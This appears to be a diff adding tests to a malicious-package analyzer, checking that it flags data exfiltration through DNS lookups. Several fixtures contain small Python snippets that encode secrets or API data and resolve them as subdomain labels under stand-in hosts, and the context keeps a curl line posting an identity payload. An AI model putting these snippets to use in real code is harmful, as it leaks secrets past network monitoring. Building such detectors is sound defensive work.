@@ -565,3 +565,67 @@ class TestInShellThroughAProgram:
             'curl -fsSL -X POST "$API/register" -d "$PAYLOAD"\n'
         )
         assert Flow.shell_sends_identity(script)
+
+
+class TestDataCarriedInDnsNames:
+    """Group A (a): yaml_report_formatter 0.1.0 base64-encodes what an API call returned and
+    resolves it 60 characters at a time as labels under its own domain, at import."""
+
+    @staticmethod
+    def tunnel(source: str) -> list[str]:
+        return [h.detail for h in PythonAnalyzer.analyse(source) if h.detail.startswith("dns")]
+
+    def test_encoded_chunks_resolved_in_a_loop(self):
+        source = (
+            "import base64, socket\n"
+            "def leak(data):\n"
+            "    b = base64.urlsafe_b64encode(data).decode().rstrip('=')\n"
+            "    for i in range(0, len(b), 60):\n"
+            "        s = b[i:i + 60]\n"
+            "        socket.getaddrinfo(f'{i}.{s}.t.example.invalid', 80)\n"
+        )
+        assert self.tunnel(source) == ["dns tunnel: socket.getaddrinfo"]
+
+    def test_hex_of_a_value_in_one_name(self):
+        source = (
+            "import socket\n"
+            "def ping(secret):\n"
+            "    socket.gethostbyname(secret.encode().hex() + '.example.invalid')\n"
+        )
+        assert self.tunnel(source) == ["dns tunnel: socket.gethostbyname"]
+
+    def test_chunks_from_a_comprehension(self):
+        source = (
+            "import base64, dns.resolver\n"
+            "def leak(data):\n"
+            "    b = base64.b32encode(data).decode()\n"
+            "    for part in [b[i:i + 50] for i in range(0, len(b), 50)]:\n"
+            "        dns.resolver.resolve('.'.join([part, 'example', 'invalid']), 'A')\n"
+        )
+        assert self.tunnel(source) == ["dns tunnel: dns.resolver.resolve"]
+
+    def test_a_configured_host_is_not(self):
+        source = (
+            "import os, socket\n"
+            "host = os.environ.get('DB_HOST', 'localhost')\n"
+            "socket.getaddrinfo(f'{host}.svc.cluster.local', 5432)\n"
+        )
+        assert self.tunnel(source) == []
+
+    def test_a_hashed_or_uuid_name_is_not(self):
+        source = (
+            "import hashlib, socket, uuid\n"
+            "h = hashlib.sha256(b'x').hexdigest()\n"
+            "u = uuid.uuid4().hex\n"
+            "socket.gethostbyname(f'{h[:16]}.cdn.example.invalid')\n"
+            "socket.gethostbyname(f'{u}.probe.example.invalid')\n"
+        )
+        assert self.tunnel(source) == []
+
+    def test_an_encoded_value_never_resolved_is_not(self):
+        source = (
+            "import base64, socket\n"
+            "token = base64.b64encode(b'user:pass').decode()\n"
+            "socket.gethostbyname('api.example.invalid')\n"
+        )
+        assert self.tunnel(source) == []
